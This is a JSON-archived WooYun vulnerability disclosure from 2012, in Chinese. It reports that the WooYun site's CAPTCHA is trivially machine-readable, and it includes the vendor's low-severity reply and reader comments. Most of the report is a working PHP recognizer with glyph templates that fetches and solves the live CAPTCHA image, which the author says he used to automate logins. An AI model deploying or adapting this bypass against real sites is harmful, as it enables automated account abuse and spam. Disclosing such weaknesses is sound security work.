{"id": 16394, "wybug_id": "wooyun-2012-012722", "wybug_title": "乌云官方验证码容易识别的bug", "wybug_corp": "乌云官方", "wybug_author": "l4yn3", "wybug_date": "2012-09-25 19:31", "wybug_open_date": "2012-11-09 19:31", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-10-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-10-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-10-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-11-09：\t细节向公众公开  简要描述： 乌云官方网站验证码过于简单，用很简单的程序就可以识别出来 详细说明：  乌云官方网站验证码过于简单，用很简单的程序就可以识别出来，然后应该可以绕过验证码进行灌水，我只测试了绕过验证码自动登录。\n\n特征：1.四个字符，2.基本无干扰素。3.字符的rgb特征分别为（255,255,255）或(0, 0, 0)，根据此特征可识别字符。4.共涉及字母和数字22个，貌似没有0和O,1和I，可能是怕分不清楚。5.字符间距各1个像素，很固定。6.字符宽度8像素，高度10像素，很固定。7.图片上间距和左间距固定，各为4px和14px,固定不变。识别思路：1.二值化，根据字符的rgb特征分别为（255,255,255）或(0, 0, 0)的特征将字符像素变成1，其他为0.2.取字模，手机22个验证码字符的二进制字模。3.和乌云验证码对比，识别验证码。\n<?php/*=============================================================================#     FileName: get_word_from_imge.php#         Desc: 简单的验证码识别程序#       Author: l4yn3#     HomePage: http://hi.baidu.com/l4yn3/#      Version: 0.0.1#   LastChange: 2012-09-25 18:46:32#     参考知识: http://blog.csdn.net/ugg/article/details/3953137=============================================================================*/define('WORD_WIDTH',8);   //字符宽度define('WORD_HIGHT',10);  //字符高度define('WORD_SPACING',1);  //字符间距/** * 乌云官方验证码识别类 */class valite{\tvar $data;\tvar $Keys;\tvar $ImagePath;\tpublic function setImage($image)\t{\t\t$this->ImagePath = $image;\t}\t\tpublic function getHec()\t{\t\tglobal $sign;\t\t$num = ($sign == \"black\") ? 0 : 255 * 3;\t\t$res = imagecreatefrompng($this->ImagePath);\t\t$size = getimagesize($this->ImagePath);\t\t$data = array();\t\tfor($i = 0; $i < $size[1]; ++$i)\t\t{\t\t\tfor($j=0; $j < $size[0]; ++$j)\t\t\t{\t\t\t\t$rgb = imagecolorat($res,$j,$i);\t\t\t\t$rgbarray = imagecolorsforindex($res, $rgb);\t\t\t\tif($rgbarray['red'] + $rgbarray['green'] + $rgbarray['blue'] !== $num)\t\t\t\t{\t\t\t\t\t$data[$i][$j] = 0;\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t$data[$i][$j] = 1;\t\t\t\t}\t\t\t}\t\t}\t\t$this->DataArray = $data;\t\t$this->ImageSize = $size;\t}\t\tpublic function run()\t{\t\tglobal $offset_x, $offset_y, $sign;\t\t$num = ($sign == \"black\") ? 0 : 255 * 3;   //判断是黑色文字还是白色文字\t\t$result=\"\";\t\t$data = array(\"\",\"\",\"\",\"\");\t\t$res = imagecreatefrompng($this->ImagePath);\t\t$size = getimagesize($this->ImagePath);\t\t\t\tfor($a = 1; $a <= 4; $a++)\t\t{\t\t\t$str = '';\t\t\tfor($i = $offset_y; $i < $offset_y + WORD_HIGHT; $i++)\t\t\t{\t\t\t\tfor($j = $offset_x + ($a - 1) * WORD_WIDTH + ($a - 1) * WORD_SPACING; $j < $offset_x + WORD_WIDTH * $a + ($a - 1) * WORD_SPACING; $j++)\t\t\t\t{\t\t\t\t\t$rgb = imagecolorat($res, $j, $i);\t\t\t\t\t$rgb_arr = imagecolorsforindex($res, $rgb);\t\t\t\t\t$data[$a-1] .= $this->DataArray[$i][$j];\t\t\t\t}\t\t\t}\t\t}\t\t\t\t// 进行关键字匹配\t\tforeach($data as $numKey => $numString)\t\t{\t\t\t$max = 0.0;\t\t\t$num = 0;\t\t\tforeach($this->Keys as $key => $value)\t\t\t{\t\t\t\t$percent = 0.0;\t\t\t\tsimilar_text($value, $numString,$percent);  //判断字符的相似度\t\t\t\tif(intval($percent) > $max)\t\t\t\t{\t\t\t\t\t$max = $percent;\t\t\t\t\t$num = $key;\t\t\t\t\tif(intval($percent) == 100)\t\t\t\t\tbreak;\t\t\t\t}\t\t\t}\t\t\t$result.=$num;\t\t}\t\t$this->data = $result;\t\treturn $result;\t}\tpublic function __construct()\t{\t\t/*识别出来的乌云验证码字模信息*/\t\t$this->Keys = array(\t\t'0'=>'',\t\t'1'=>'',\t\t'2'=>'00111100011001101100001100000011000001100000110000011000001100000110000011111111',\t\t'3'=>'01111100110001100000001100000110000111000000011000000011000000111100011001111100',\t\t'4'=>'00000110000011100001111000110110011001101100011011111111000001100000011000000110',\t\t'5'=>'11111110110000001100000011011100111001100000001100000011110000110110011000111100',\t\t'6'=>'00111100011001101100001011000000110111001110011011000011110000110110011000111100',\t\t'7'=>'11111111000000110000001100000110000011000001100000110000011000001100000011000000',\t\t'8'=>'00111100011001101100001101100110001111000110011011000011110000110110011000111100',\t\t'9'=>'00111100011001101100001111000011011001110011101100000011010000110110011000111100',\t\t'A'=>'00011000001111000110011011000011110000111100001111111111110000111100001111000011',\t\t'B'=>'11111100110001101100001111000110111111001100011011000011110000111100011011111100',\t\t'C'=>'00111110011000111100000111000000110000001100000011000000110000010110001100111110',\t\t'D'=>'11111100110001101100001111000011110000111100001111000011110000111100011011111100',\t\t'E'=>'11111110110000001100000011000000111111001100000011000000110000001100000011111110',\t\t'F'=>'11111111110000001100000011000000111111001100000011000000110000001100000011000000',\t\t'G'=>'00111110011000111100000011000000110000001100011111000011110000110110001100111110',\t\t'H'=>'11000011110000111100001111000011111111111100001111000011110000111100001111000011',\t\t'I'=>'',\t\t'J'=>'00011110000001100000011000000110000001100000011000000110010001100110110000111000',\t\t'K'=>'11000011110001101100110011011000111100001111000011011000110011001100011011000011',\t\t'L'=>'11000000110000001100000011000000110000001100000011000000110000001100000011111110',\t\t'M'=>'11000011111001111111111111011011110110111101101111000011110000111100001111000011',\t\t'N'=>'11000011111000111111001111110011110110111101101111001111110001111100011111000011',\t\t'O'=>'',\t\t'P'=>'11111110110000111100001111000011111111101100000011000000110000001100000011000000',\t\t'Q'=>'00111100011001101100001111000011110000111100001111011011110011110110011000111101',\t\t'R'=>'11111110110000111100001111000011111111101111100011001100110001101100001111000011',\t\t'S'=>'01111110110000111100000011000000011111100000001100000011000000111100001101111110',\t\t'T'=>'11111111000110000001100000011000000110000001100000011000000110000001100000011000',\t\t'U'=>'11000011110000111100001111000011110000111100001111000011110000110110011000111100',\t\t'V'=>'11000011110000111100001101100110011001100110011000111100001111000001100000011000',\t\t'W'=>'11000011110000111100001111000011110110111101101111011011111111111110011111000011',\t\t'X'=>'11000011110000110110011000111100000110000001100000111100011001101100001111000011',\t\t'Y'=>'11000011110000110110011000111100000110000001100000011000000110000001100000011000',\t\t'Z'=>'11111110000001100000011000001100000110000011000001100000110000001100000011111110',\t);\t}}/** * * 此函数用于获得字符特征值，即获取验证码的特征值 */function getOffSetX($img){\tglobal $offset_x, $offset_y, $sign;\t$res = imagecreatefrompng($img);\t$size = getimagesize($img);\tfor($a = 1; $a <= 4; $a++)\t{\t\t$str = '';\t\tfor($i = $offset_y; $i < $offset_y + WORD_HIGHT; $i++)\t\t{\t\t\tfor($j = $offset_x + ($a - 1) * WORD_WIDTH + ($a - 1) * WORD_SPACING; $j < $offset_x + WORD_WIDTH * $a + ($a - 1) * WORD_SPACING; $j++)\t\t\t{\t\t\t\t$rgb = imagecolorat($res, $j, $i);\t\t\t\t$rgb_arr = imagecolorsforindex($res, $rgb);\t\t\t\t$num = ($sign == \"black\") ? 0 : 255 * 3;\t\t\t\tif($rgb_arr['red'] + $rgb_arr['green'] + $rgb_arr['blue'] != $num)\t\t\t\t{\t\t\t\t\t$str .= '0';\t\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t$str .= '1';\t\t\t\t}\t\t\t}\t\t}\t\treturn $str;\t}\treturn $str;}/** * 判断是黑色文字 还是白色文字 乌云两种颜色验证码，黑字和白字 */function checkBOrW($img){\t$res = imagecreatefrompng($img);\t$size = getimagesize($img);\t$str = \"\";\tfor($i = 0; $i < $size[1]; $i++)\t{\t\tfor($j = 0; $j < $size[0]; $j++)\t\t{\t\t\t$rgb = imagecolorat($res, $j, $i);\t\t\t$rgb_arr = imagecolorsforindex($res, $rgb);\t\t\t$str .= $rgb_arr[\"green\"].$rgb_arr[\"red\"].$rgb_arr[\"blue\"];\t\t}\t}\tif(preg_match(\"/(255){3}/\", $str))\t{\t\treturn \"white\";  //白色文字\t}\telse\t{\t\treturn 'black';  //黑色文字\t}}/** * 获取offset_x和offset_y */function getOffSet($img = ''){\tglobal $sign;\t$num = ($sign == \"black\") ? 0 : 255 * 3;   //判断是黑色文字还是白色文字\t$res = imagecreatefrompng($img);\t$size = getimagesize($img);\t$offset_x = '';\t$offset_y = '';\tfor($i = 1; $i < $size[0]; $i++)\t{\t\tfor($j = 1; $j < $size[1]; $j++)\t\t{\t\t\t$rgb = imagecolorat($res, $i, $j);\t\t\t$rgb_arr = imagecolorsforindex($res, $rgb);\t\t\tif($rgb_arr['red'] + $rgb_arr['green'] + $rgb_arr['blue'] == $num)\t\t\t{\t\t\t\t$offset_x = $i;\t\t\t\tbreak;\t\t\t}\t\t}\t\tif($offset_x)\t\t{\t\t\tbreak;\t\t}\t}\tfor($i = 1; $i < $size[1]; $i++)\t{\t\tfor($j = 1; $j < $size[0]; $j++)\t\t{\t\t\t$rgb = imagecolorat($res, $j, $i);\t\t\t$rgb_arr = imagecolorsforindex($res, $rgb);\t\t\tif($rgb_arr['red'] + $rgb_arr['green'] + $rgb_arr['blue'] == $num)\t\t\t{\t\t\t\t$offset_y = $i;\t\t\t\tbreak;\t\t\t}\t\t}\t\tif($offset_y)\t\t{\t\t\tbreak;\t\t}\t}\treturn array('offset_x'=>$offset_x, 'offset_y'=>$offset_y);}\n\n<?phpinclude(\"get_word_from_imge.php\");$img = \"http://www.wooyun.org/captcha.php\";   //验证码图片名称$content = get_remove_content($img);file_put_contents(\"hi.png\", $content);$img = \"hi.png\";$sign = checkBOrW($img);$offset_arr = getOffSet($img);print_r($offset_arr);exit;extract($offset_arr);//getOffSetX($img);  //获取特征值$valite = new valite();$valite->setImage($img);$valite->getHec();$result = $valite->run();echo $result;\n   漏洞证明：  \n\n\n\n   修复方案：  使验证码不规则化，增加更复杂的干扰素，减少可识别固定特征（比如字符间距，文字距离图片间距）。其他各种干扰方式。   版权声明：转载请注明来源 l4yn3@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2012-09-25 19:32 厂商回复： 非常感谢作者详细的提交，内容非常丰富，但是这个问题我们认为我们可能不会修复 ：） 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-09-25 19:33 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  又来了。。。    \n     2012-09-25 19:39 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  月经洞    \n     2012-09-25 20:55 |    \t\tl4yn3 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:3        | PHPER)\t\t \n  哈，环境不同，问题的重要性不同。理解。    \n     2012-09-26 16:10 |    \t\t凤凰 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 涅磐)\t\t \n  @l4yn3 求识别程序哈    \n     2012-09-26 16:12 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @l4yn3 +1    \n     2012-10-05 19:51 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  很赞    \n     2012-10-16 08:35 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  终于看到你了，哈哈    \n     2012-10-26 10:08 |    \t\tBreaker \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:1        )\t\t \n  为什么不修复呀？    \n     2012-11-09 20:15 |    \t\t苦逼老爷爷 \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:17        | 用户太懒什么都没留下)\t\t \n  最恨那些神人共愤的验证码，叫上几个人来一起研究半天错上n次后才能蒙对一次。这用户体验，不提了。    \n     2012-11-10 15:19 |    \t\tfeixiang \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | = = ！性别男，爱好女，有理想，没技术。)\t\t \n  @Breaker wooyun采用邀请制度，所以谁敢用ID灌水试试。。。灌水一个封一个。    \n     2012-11-11 08:27 |    \t\tBreaker \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:1        )\t\t \n  @feixiang 好吧....     \n     2012-11-11 17:26 |    \t\tl4yn3 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:3        | PHPER)\t\t \n  @feixiang 首先问题算不算问题不应该由客观条件决定，而且貌似提交漏洞不需要是乌云会员吧，这个点能不能灌各位可以试试。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}